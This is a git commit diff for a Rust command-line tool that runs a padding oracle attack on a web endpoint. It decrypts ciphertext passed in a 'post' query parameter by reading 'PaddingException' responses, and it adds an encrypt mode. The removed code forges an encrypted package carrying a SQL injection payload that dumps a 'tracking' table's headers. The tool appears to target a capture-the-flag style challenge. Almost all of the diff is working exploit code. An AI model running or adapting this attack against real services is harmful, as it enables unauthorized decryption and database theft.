ac1ca5868c577a513c91ccc024b163ddcd1afc8c
Aoife Bradley <me@ifa.codes>
2024-03-10 18:43:07 -0400

    .

--- src/decrypt.rs
+++ src/decrypt.rs
@@ -1,46 +1,65 @@
-use std::{
-    io::{self, Write},
-    process::Output,
-    sync::Mutex,
-    thread::JoinHandle,
-};
-
+use crate::shared::*;
 use anyhow::Result;
 use base64::{prelude::BASE64_STANDARD, Engine};
-use indicatif::{ProgressBar, ProgressStyle};
+use indicatif::{MultiProgress, ProgressBar, ProgressStyle};
+use parking_lot::Mutex;
 use rayon::prelude::*;
-use reqwest::{blocking::Client, Url};
-
-static CHUNK_SIZE: usize = 16;
-
-trait ModBase64 {
-    type Output;
-    fn fix_base64(self) -> Self::Output;
-    fn fuckup_base64(self) -> Self::Output;
-}
+use reqwest::blocking::Client;
 
 pub fn decrypt(url: String, ciphertext: &str) -> Result<()> {
     let client = Client::new();
     let ciphertext = BASE64_STANDARD.decode(ciphertext.fix_base64())?;
+    let plaintext: Mutex<[[Option<u8>; 16]; 10]> = Mutex::new([[None; 16]; 10]);
     rayon::ThreadPoolBuilder::new()
         .num_threads(64)
         .build()
         .unwrap()
         .install(|| {
-            let bar = ProgressBar::new((ciphertext.len() * 256 / 2) as u64);
+            let mb = MultiProgress::new();
+            let bar = mb.add(ProgressBar::new((ciphertext.len()) as u64));
             bar.set_style(
                 ProgressStyle::with_template("{wide_bar} {pos}/{len} {per_sec} {eta_precise}")
                     .unwrap(),
             );
-            let mut plaintext: Vec<Vec<u8>> = ciphertext
+            let message = mb.insert_after(&bar, ProgressBar::new((10 / CHUNK_SIZE * 256) as u64));
+            message.set_style(ProgressStyle::with_template("{wide_msg}").unwrap());
+            let guard = plaintext.lock();
+            message.set_message(
+                guard
+                    .into_iter()
+                    .flatten()
+                    .map(|opt| match opt {
+                        Some(value) => value as char,
+                        None => '░',
+                    })
+                    .collect::<String>()
+                    .to_string(),
+            );
+            drop(guard);
+            ciphertext
                 .par_windows(CHUNK_SIZE * 2)
                 .enumerate()
                 .rev()
                 .step_by(CHUNK_SIZE)
-                .map(|(n, chunks)| {
+                .for_each(|(n, chunks)| {
                     let mut cipherblock = [0u8; 16];
                     let mut intermediate = [0u8; 16];
+
                     for byte in 1..=CHUNK_SIZE {
+                        let guard = plaintext.lock();
+                        message.set_message(
+                            guard
+                                .into_iter()
+                                .flatten()
+                                .map(|opt| match opt {
+                                    Some(value) => value as char,
+                                    None => '░',
+                                })
+                                .collect::<String>()
+                                .replace('\n', " ")
+                                .to_string(),
+                        );
+                        drop(guard);
                         if let Some(value) = (0u8..=255).into_par_iter().find_any(|&value| {
                             let mut cipherblock: [u8; 16] = cipherblock;
                             cipherblock[16 - byte] = value;
@@ -52,16 +71,13 @@ pub fn decrypt(url: String, ciphertext: &str) -> Result<()> {
                             let res = client.get(&url).query(&[("post", encoded)]).send().unwrap();
                             let text = res.text().unwrap();
 
-                            // println!("{} {byte} {cipherblock:x?}", n / CHUNK_SIZE);
-                            bar.inc(1);
-                            if !text.contains("PaddingException") {
-                                bar.println(&text);
-                                if text.contains("UnicodeDecodeError")
+                            if !text.contains("PaddingException")
+                                && (text.contains("UnicodeDecodeError")
                                     || text.contains("ValueError")
-                                    || byte != 1
-                                {
-                                    return true;
-                                }
+                                    || byte != 1)
+                            {
+                                bar.inc(1);
+                                return true;
                             }
                             false
                         }) {
@@ -70,35 +86,36 @@ pub fn decrypt(url: String, ciphertext: &str) -> Result<()> {
                             for x in 1..=byte {
                                 cipherblock[16 - x] = intermediate[16 - x] ^ (byte as u8 + 1);
                             }
+                            let mut guard = plaintext.lock();
+                            guard[n / 16][CHUNK_SIZE - byte] =
+                                Some(intermediate[CHUNK_SIZE - byte] ^ chunks[CHUNK_SIZE - byte]);
+                            message.set_message(
+                                guard
+                                    .into_iter()
+                                    .flatten()
+                                    .map(|opt| match opt {
+                                        Some(value) => value as char,
+                                        None => '░',
+                                    })
+                                    .collect::<String>()
+                                    .trim_end_matches(|x| !char::is_ascii(&x))
+                                    .to_string(),
+                            );
                         }
                     }
-                    let newplaintext: Vec<u8> = intermediate
-                        .iter()
-                        .zip(&chunks[0..CHUNK_SIZE])
-                        .map(|(&x1, &x2)| x1 ^ x2)
-                        .collect();
-                    newplaintext
-                })
-                .collect();
-            plaintext.reverse();
-            println!(
-                "{}",
-                String::from_utf8(plaintext.concat()).unwrap().trim_end()
-            );
+                });
         });
-
+    println!(
+        "{}",
+        String::from_utf8(
+            plaintext
+                .lock()
+                .into_iter()
+                .flatten()
+                .map(|opt| opt.unwrap_or(32))
+                .collect::<Vec<u8>>()
+        )?
+        .trim_end()
+    );
     Ok(())
-}
-
-fn test_byte(client: &Client) {}
-
-impl ModBase64 for &str {
-    type Output = String;
-    fn fix_base64(self) -> Self::Output {
-        self.replace('~', "=").replace('!', "/").replace('-', "+")
-    }
-
-    fn fuckup_base64(self) -> Self::Output {
-        self.replace('=', "~").replace('/', "!").replace('+', "-")
-    }
 }
--- src/main.rs
+++ src/main.rs
@@ -1,385 +1,39 @@
 mod decrypt;
+mod encrypt;
+mod shared;
 use anyhow::{Result, *};
 use base64::{prelude::BASE64_STANDARD, Engine};
 use clap::Parser;
 use decrypt::decrypt;
+use encrypt::encrypt;
 use reqwest::{blocking::Client, Url};
 use std::{
     io::{self, Write},
-    sync::{atomic::AtomicU16, Arc, Condvar, Mutex},
-    thread::sleep,
-    time::Duration,
+    sync::{Arc, Condvar, Mutex},
 };
 
 #[derive(Debug, Parser)]
 #[command(version, about, long_about = None)]
 struct Args {
     url: Url,
-    #[arg(long = "ciphertext")]
-    base64: String,
-    #[arg(short, long)]
-    iv: Option<String>,
-    #[arg(short, long)]
-    new: bool,
-}
-
-pub struct Semaphore {
-    counter: Mutex<usize>,
-    condvar: Condvar,
-    limit: usize,
-}
-
-pub struct SemaphoreGuard<'a> {
-    semaphore: &'a Semaphore,
-}
-
-impl Semaphore {
-    pub fn start(&self) -> SemaphoreGuard<'_> {
-        // wait for availability
-        let mut count = self.counter.lock().unwrap();
-        while *count >= self.limit {
-            count = self.condvar.wait(count).unwrap();
-        }
-
-        *count += 1;
-        SemaphoreGuard { semaphore: self }
-    }
-
-    fn decrement(&self) {
-        *self.counter.lock().unwrap() -= 1;
-        self.condvar.notify_all();
-    }
-
-    pub fn new(limit: usize) -> Self {
-        Self {
-            counter: Mutex::new(0),
-            condvar: Condvar::new(),
-            limit,
-        }
-    }
-}
-
-impl Drop for SemaphoreGuard<'_> {
-    fn drop(&mut self) {
-        self.semaphore.decrement()
-    }
+    #[arg(short, long, conflicts_with = "encrypt")]
+    decrypt: Option<String>,
+    #[arg(short, long, conflicts_with = "decrypt")]
+    encrypt: Option<String>,
 }
 
 fn main() -> Result<()> {
     let args = Args::parse();
 
-    println!("{args:#?}");
-
-    if args.new {
-        decrypt(args.url.to_string(), &args.base64)?;
+    if let Some(ciphertext) = args.decrypt {
+        decrypt(args.url.to_string(), &ciphertext)?;
         return Ok(());
     }
 
-    let client = Client::new();
-    let mut chunks: Vec<Vec<u8>> = BASE64_STANDARD
-        .decode(
-            &args
-                .base64
-                .replace('~', "=")
-                .replace('!', "/")
-                .replace('-', "+"),
-        )?
-        .chunks(16)
-        .map(|chunk| chunk.to_vec())
-        .collect();
-
-    chunks
-        .iter()
-        .flatten()
-        .for_each(|chunk| print!("{chunk:x?} "));
-    let orig_chunks = chunks.clone();
-    let len = chunks.len();
-    let mut plaintext: Vec<Vec<u8>> = vec![];
-    let url = &args.url;
-
-    let finished = Arc::new((Mutex::new(None::<u8>), Condvar::new()));
-    let generation = Mutex::new(1u8);
-    std::thread::scope(|scope| -> Result<()> {
-        for chunk in 2..=10 {
-            let mut intermediates = [0u8; 16];
-            chunks = orig_chunks.clone();
-            for i in 1u8..=16 {
-                *(generation.lock().unwrap()) = i;
-                println!("chunk: #{}", len - chunk);
-                println!("i: {i}");
-                let mut handles = vec![];
-                let semaphore = Arc::new(Semaphore::new(30));
-                for b in 0u8..=255 {
-                    let mut chunks = chunks.clone();
-                    let client = &client;
-                    let semaphore = semaphore.clone();
-                    let finished = finished.clone();
-                    let generation = &generation;
-                    let orig_chunks = &orig_chunks;
-                    let handle = scope.spawn(move || {
-                        chunks[len - chunk][16 - i as usize] = b;
-                        if chunks[len - chunk] == orig_chunks[len - chunk] {
-                            return;
-                        }
-                        // println!(
-                        //     "{:x?}",
-                        //     chunks
-                        //         .clone()
-                        //         .into_iter()
-                        //         .skip(8)
-                        //         .flatten()
-                        //         .collect::<Vec<_>>()
-                        // );
-                        let encoded = BASE64_STANDARD
-                            .encode(
-                                chunks
-                                    .clone()
-                                    .into_iter()
-                                    .skip(len - chunk)
-                                    .take(2)
-                                    .flatten()
-                                    .collect::<Vec<_>>(),
-                            )
-                            .replace('=', "~")
-                            .replace('/', "!")
-                            .replace('+', "-");
-                        let guard = semaphore.start();
-                        let res = client
-                            .get(url.as_str())
-                            .query(&[("post", encoded)])
-                            .send()
-                            .unwrap();
-                        drop(guard);
-                        if *(generation.lock().unwrap()) != i {
-                            return;
-                        }
-                        let text = res.text().unwrap();
-                        if text.contains("PaddingException") {
-                            print!("{b} ");
-                            io::stdout().flush().unwrap();
-                        } else {
-                            println!("\n{b} {text}");
-                            if text.contains("UnicodeDecodeError")
-                                || text.contains("ValueError")
-                                || i != 1
-                            {
-                                let (finished_b, finished_condvar) = &*finished;
-                                *(finished_b.lock().unwrap()) = Some(b);
-                                finished_condvar.notify_one();
-                            }
-                        }
-                    });
-
-                    handles.push(handle);
-                }
-
-                let (finished_b, finished_condvar) = &*finished.clone();
-                let mut b_guard = finished_b.lock().unwrap();
-                while (*b_guard).is_none() {
-                    b_guard = finished_condvar.wait(b_guard).unwrap();
-                }
-                let b = (*b_guard).take();
-                drop(b_guard);
-                if let Some(b) = b {
-                    // then continue here with the loop
-                    intermediates[16 - i as usize] = b ^ i;
-                    let second_last = chunks.get_mut(len - chunk).unwrap();
-                    println!("{second_last:x?}");
-                    for x in 1..=i {
-                        second_last[16 - x as usize] = intermediates[16 - x as usize] ^ (i + 1);
-                    }
-                    println!("{second_last:x?}");
-                    continue;
-                } else {
-                    panic!()
-                }
-            }
-
-            println!("{:x?}", intermediates);
-            let newplaintext: Vec<u8> = intermediates
-                .iter()
-                .zip(orig_chunks.get(len - chunk).unwrap().iter())
-                .map(|(&x1, &x2)| x1 ^ x2)
-                .collect();
-            plaintext.push(newplaintext);
-            println!("{:?}", plaintext);
-
-            if chunk == 10 {
-                plaintext.reverse();
-                println!("{}", String::from_utf8(plaintext.concat())?);
-            }
-        }
-        Ok(())
-    })?;
-    // plaintext.reverse();
-    // println!("{}", String::from_utf8(plaintext.concat())?);
-
-    Ok(())
-}
-
-fn make_package(block3: &[u8], block4: &[u8]) -> String {
-    BASE64_STANDARD
-        .encode([block3, block4].concat())
-        .replace('=', "~")
-        .replace('/', "!")
-        .replace('+', "-")
-}
-
-fn output_new_package(args: &Args) -> Result<()> {
-    // set package
-    let input = r#"{"id": "NULL UNION SELECT GROUP_CONCAT(headers), NULL FROM tracking", "key": "SKuFkF2C4Hp0Sljv!OOUDA~~"}"#;
-    // change to bytes and pad
-    let mut bytes = input.as_bytes().to_vec();
-    let padding = 16 - (bytes.len() % 16);
-    bytes.extend((0..padding).map(|_| padding as u8));
-    println!("plaintext {:?}", &bytes);
-    println!("blocks {:?}", bytes.len() / 16);
-
-    let mut ciphertext = vec![vec![0u8; 16]];
-    let mut client = Arc::new(Client::new());
-
-    for textchunk in bytes.chunks_exact(16).rev() {
-        let mut chunks = vec![[0u8; 16].to_vec(), ciphertext.last().unwrap().to_vec()];
-        let mut orig_chunks = chunks.clone();
-        let len = chunks.len();
-        let mut intermediates = [0u8; 16];
-        let mut plaintext: Vec<Vec<u8>> = vec![];
-        let url = Arc::new(args.url.clone());
-        for chunk in 2..=2 {
-            let mut intermediates = [0u8; 16];
-            chunks = orig_chunks.clone();
-            for i in 1u8..=16 {
-                println!("chunk: #{}", len - chunk);
-                println!("i: {i}");
-
-                let mut handles = vec![];
-                let semaphore = Arc::new(Semaphore::new(20));
-                for b in 0u8..=255 {
-                    let url = url.clone();
-                    let mut chunks = chunks.clone();
-                    let client = client.clone();
-                    let semaphore = semaphore.clone();
-                    let handle = std::thread::spawn(move || -> Option<u8> {
-                        {
-                            let second_last = chunks.get_mut(len - chunk).unwrap();
-                            second_last[16 - i as usize] = b;
-                        }
-                        // println!(
-                        //     "{:x?}",
-                        //     chunks
-                        //         .clone()
-                        //         .into_iter()
-                        //         .skip(8)
-                        //         .flatten()
-                        //         .collect::<Vec<_>>()
-                        // );
-                        let encoded = BASE64_STANDARD
-                            .encode(
-                                chunks
-                                    .clone()
-                                    .into_iter()
-                                    .skip(len - chunk)
-                                    .take(2)
-                                    .flatten()
-                                    .collect::<Vec<_>>(),
-                            )
-                            .replace('=', "~")
-                            .replace('/', "!")
-                            .replace('+', "-");
-                        // loop {
-                        //     {
-                        //         let mut lock = atomic.lock().ok()?;
-                        //         if *lock > 0 {
-                        //             *lock -= 1;
-                        //             break;
-                        //         }
-                        //     }
-                        //     sleep(Duration::from_millis(100));
-                        // }
-                        let guard = semaphore.start();
-                        //sleep(Duration::from_millis(100));
-                        let res = client
-                            .get(url.as_str())
-                            .query(&[("post", encoded)])
-                            .send()
-                            .ok()?;
-                        drop(guard);
-                        // {
-                        //     let mut lock = atomic.lock().ok()?;
-                        //     *lock += 1;
-                        // }
-                        let text = res.text().ok()?;
-                        if text.contains("PaddingException") {
-                            print!("{b} ");
-                            io::stdout().flush().unwrap();
-                        } else {
-                            println!("\n{b} {text}");
-                            if text.contains("UnicodeDecodeError")
-                                || text.contains("ValueError")
-                                || i != 1
-                            {
-                                // println!("hit a Some!");
-                                return Some(b);
-                            }
-                        }
-                        //println!("hit a None!");
-                        None
-                    });
-                    handles.push(handle);
-                }
-
-                let mut b: Option<u8> = None;
-                for handle in handles {
-                    if let Some(x) = handle.join().unwrap() {
-                        b = Some(x);
-                        break;
-                    }
-                }
-                if let Some(b) = b {
-                    // then continue here with the loop
-                    intermediates[16 - i as usize] = b ^ i;
-                    let second_last = chunks.get_mut(len - chunk).unwrap();
-                    println!("{second_last:x?}");
-                    for x in 1..=i {
-                        second_last[16 - x as usize] = intermediates[16 - x as usize] ^ (i + 1);
-                    }
-                    println!("{second_last:x?}");
-                    continue;
-                } else {
-                    panic!()
-                }
-            }
-
-            println!("{:x?}", intermediates);
-            let newplaintext: Vec<u8> = intermediates
-                .iter()
-                .zip(textchunk)
-                .map(|(&x1, &x2)| x1 ^ x2)
-                .collect();
-            ciphertext.push(newplaintext);
-        }
+    if let Some(plaintext) = args.encrypt {
+        encrypt(args.url.to_string(), &plaintext)?;
+        return Ok(());
     }
-
-    let encoded = BASE64_STANDARD
-        .encode(
-            ciphertext
-                .clone()
-                .into_iter()
-                .rev()
-                .flatten()
-                .collect::<Vec<u8>>(),
-        )
-        .replace('=', "~")
-        .replace('/', "!")
-        .replace('+', "-");
-    let res = client
-        .get(args.url.as_str())
-        .query(&[("post", encoded)])
-        .send()?;
-    let text = res.text()?;
-    println!("{text}");
-
-    // println!("{}", String::from_utf8(plaintext.concat())?);
 
     Ok(())
 }
